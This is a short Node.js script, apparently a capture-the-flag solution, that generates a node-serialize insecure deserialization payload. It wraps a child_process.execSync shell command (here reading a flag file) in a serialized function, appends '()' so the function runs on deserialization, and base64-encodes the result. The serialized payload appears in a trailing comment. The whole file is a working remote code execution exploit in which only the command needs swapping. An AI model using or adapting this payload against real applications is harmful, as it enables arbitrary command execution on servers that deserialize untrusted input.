var y = {
  username: function () {
    const res = require('child_process').execSync('cat my_fl4g.lol', function (error,
      stdout, stderr) {
        console.log(stdout);
        res = stdout;
      }
    );
    return res.toString();
  }
  //()
  ,
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

// add the () to execute the function
const temp = serialize.serialize(y).toString().replace('}"}', '}()"}');
console.log(temp);

// convert to base64 to be deserialized after
console.log('Final:', Buffer.from(temp).toString('base64'));

//{"username":"_$$ND_FUNC$$_function () {\n    const res = require('child_process').execSync('cat my_fl4g.lol', function (error,\n      stdout, stderr) {\n        console.log(stdout);\n        res = stdout;\n      }\n    );\n    return res.toString();\n  }()"}